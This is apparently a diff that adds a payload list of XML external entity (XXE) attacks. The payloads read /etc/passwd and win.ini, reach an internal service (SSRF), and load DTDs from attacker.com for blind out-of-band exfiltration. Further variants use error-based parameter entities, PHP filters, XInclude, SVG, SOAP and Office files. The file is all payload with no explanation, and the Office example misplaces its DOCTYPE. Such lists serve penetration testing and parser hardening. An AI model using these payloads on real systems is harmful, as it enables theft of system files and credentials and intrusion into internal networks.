@@ -1,0 +1,93 @@
+# Basic XXE payloads
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+<foo>&xxe;</foo>
+
+# Classic XXE
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+# XXE using external DTD
+<?xml version="1.0"?>
+<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
+<data>&file;</data>
+
+# XXE for SSRF
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY ssrf SYSTEM "http://internal-service:8080/api/user">
+]>
+<data>&ssrf;</data>
+
+# Blind XXE (out-of-band)
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/collect.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+# XXE via XInclude
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+# XXE via SVG
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+# XXE via SOAP
+<soap:Body>
+  <foo>
+    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>]]>
+  </foo>
+</soap:Body>
+
+# XXE parameter entities
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+]>
+<data>test</data>
+
+# XXE with PHP filter for base64 encoding
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<data>&file;</data>
+
+# XXE with gzip encoding
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+]>
+<data>&file;</data>
+
+# XXE via DOCX/XLSX/PPTX
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+<Default Extension="xml" ContentType="application/xml"/>
+<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
+<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
+<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
+</Types>
